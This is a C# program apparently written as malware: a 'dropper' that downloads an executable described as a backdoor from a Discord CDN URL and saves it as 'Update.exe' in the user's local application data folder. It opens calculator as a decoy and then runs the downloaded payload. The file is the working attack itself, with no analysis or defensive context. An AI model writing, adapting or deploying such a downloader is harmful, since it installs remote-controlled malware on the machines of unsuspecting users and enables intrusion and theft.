using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace dropper
{
    internal static class Program
    {

        static string folder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        static string path = Path.Combine(folder, "Update.exe");

        static void Main()
        {
            //Download backdoor and run legit Process
           if(Download("https://cdn.discordapp.com/attachments/902704094043586610/995064198767841301/AESinjecter.exe")) {
                Process.Start("calc.exe");
                Thread.Sleep(1000);
                Process.Start(path);
                
            }
            
        }
        private static bool Download(string url)
        {
          // string Decoded = BitConverter.ToString(Convert.FromBase64String(url));

            using (WebClient client = new WebClient())
            {
                //Download The File
                client.DownloadFile(url, path);
                Thread.Sleep(1000);
                if (File.Exists(path)) {
                    return true;
                } 
                else
                {
                    return false;
                }
                
            }
        }
        
    }
}
